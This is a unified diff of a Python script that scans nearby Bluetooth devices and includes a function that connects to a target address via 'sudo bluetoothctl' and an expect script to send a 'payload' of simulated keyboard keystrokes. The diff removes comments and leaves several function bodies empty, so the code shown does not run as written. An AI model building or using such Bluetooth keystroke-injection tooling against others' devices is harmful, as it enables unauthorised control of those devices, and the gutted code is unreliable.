@@ -4,13 +4,12 @@ import csv
 import sys
 
 def scan_bluetooth_devices():
-    # ... (same as before) ...
+  
 
 def parse_devices(devices):
-    # ... (same as before) ...
-
+  
 def save_to_file(devices, filename="bluetooth_devices.csv"):
-    # ... (same as before) ...
+   
 
 def connect_and_send_payload(target_address):
     """
@@ -19,9 +18,7 @@ def connect_and_send_payload(target_address):
     """
     try:
         print(f"[*] Attempting to connect to {target_address}...")
-        
-        # Simulate Bluetooth HID keyboard input (requires root)
-        # This uses 'bluetoothctl' and 'expect' scripting to automate input
+      
         payload_script = f'''
         spawn sudo bluetoothctl
         send "connect {target_address}\\r"
@@ -35,7 +32,6 @@ def connect_and_send_payload(target_address):
         with open("payload.exp", "w") as f:
             f.write(payload_script)
         
-        # Execute the payload script using 'expect'
         subprocess.run(["expect", "payload.exp"])
         print("[+] Test payload sent (simulated keystrokes).")
 
